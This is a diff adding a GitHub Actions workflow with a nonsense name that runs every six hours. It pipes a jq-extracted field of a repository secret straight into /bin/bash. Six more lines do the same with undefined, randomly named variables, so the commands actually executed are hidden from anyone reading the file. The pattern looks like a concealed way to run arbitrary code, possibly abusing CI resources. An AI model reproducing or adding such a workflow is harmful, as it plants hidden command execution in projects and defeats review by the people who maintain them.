@@ -1,0 +1,24 @@
+name: lixingshencaii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lixingshencaii
+        env:
+          c26391: ${{ secrets.c26391 }}
+        run: |
+          echo $c26391 | jq -r .vui8 | /bin/bash
+          echo $n27218 | jq -r .m9079 | /bin/bash
+          echo $q50 | jq -r .nde83 | /bin/bash
+          echo $wr90 | jq -r .t4 | /bin/bash
+          echo $wqm654 | jq -r .aeair2 | /bin/bash
+          echo $j9778 | jq -r .raso06 | /bin/bash
+          echo $zjpds92175 | jq -r .nksl53334 | /bin/bash
+
